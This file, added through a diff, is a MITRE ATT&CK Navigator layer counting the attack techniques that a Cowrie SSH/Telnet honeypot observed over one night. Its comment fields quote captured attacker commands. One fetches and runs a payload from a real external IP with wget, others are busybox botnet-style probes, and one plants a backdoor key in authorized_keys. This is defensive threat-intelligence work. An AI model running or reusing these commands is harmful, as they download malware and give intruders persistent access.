@@ -1,0 +1,330 @@
+{
+  "name": "Cowrie Honeypot",
+  "versions": {
+    "attack": "14",
+    "navigator": "4.9.0",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-08-11 01:42:11",
+  "filters": {
+    "platforms": [
+      "Linux"
+    ]
+  },
+  "sorting": 3,
+  "layout": {
+    "layout": "side",
+    "showID": true,
+    "showName": true
+  },
+  "hideDisabled": true,
+  "techniques": [
+    {
+      "techniqueID": "T1110.001",
+      "score": 515,
+      "enabled": true,
+      "comment": "515 observation(s) from 12 unique IP(s). e.g. root / 123456",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Credential Access"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "12"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T00:00:02"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:09"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1222.002",
+      "score": 35,
+      "enabled": true,
+      "comment": "35 observation(s) from 4 unique IP(s). e.g. /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Defense Evasion"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "4"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T00:40:37"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:17"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 15,
+      "enabled": true,
+      "comment": "15 observation(s) from 4 unique IP(s). e.g. (wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Command and Control"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "4"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T00:40:37"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:17"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1078",
+      "score": 13,
+      "enabled": true,
+      "comment": "13 observation(s) from 9 unique IP(s). e.g. uname -a / exit",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Initial Access"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "9"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T00:00:05"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:12"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1057",
+      "score": 3,
+      "enabled": true,
+      "comment": "3 observation(s) from 1 unique IP(s). e.g. /bin/busybox ps; /bin/busybox ECCHI",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Discovery"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "1"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T00:40:36"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:21:50"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1033",
+      "score": 2,
+      "enabled": true,
+      "comment": "2 observation(s) from 2 unique IP(s). e.g. (wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Discovery"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "2"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T00:53:13"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:21:49"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1082",
+      "score": 2,
+      "enabled": true,
+      "comment": "2 observation(s) from 2 unique IP(s). e.g. uname -s -v -n -r -m",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Discovery"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "2"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T00:27:16"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:17"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1037",
+      "score": 1,
+      "enabled": true,
+      "comment": "1 observation(s) from 1 unique IP(s). e.g. #!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Persistence"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "1"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T01:37:17"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:17"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1059.004",
+      "score": 1,
+      "enabled": true,
+      "comment": "1 observation(s) from 1 unique IP(s). e.g. #!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Execution"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "1"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T01:37:17"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:17"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1083",
+      "score": 1,
+      "enabled": true,
+      "comment": "1 observation(s) from 1 unique IP(s). e.g. #!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Discovery"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "1"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T01:37:17"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:17"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1098.004",
+      "score": 1,
+      "enabled": true,
+      "comment": "1 observation(s) from 1 unique IP(s). e.g. mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Persistence"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "1"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T01:37:12"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:12"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1489",
+      "score": 1,
+      "enabled": true,
+      "comment": "1 observation(s) from 1 unique IP(s). e.g. #!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Impact"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "1"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-11T01:37:17"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-11T01:37:17"
+        }
+      ]
+    }
+  ],
+  "gradient": {
+    "colors": [
+      "#ffe766",
+      "#ff8c42",
+      "#f85149"
+    ],
+    "minValue": 0,
+    "maxValue": 515
+  },
+  "legendItems": [
+    {
+      "label": "observed on this honeypot",
+      "color": "#f85149"
+    }
+  ],
+  "showTacticRowBackground": true,
+  "tacticRowBackground": "#21262d",
+  "selectTechniquesAcrossTactics": true
+}
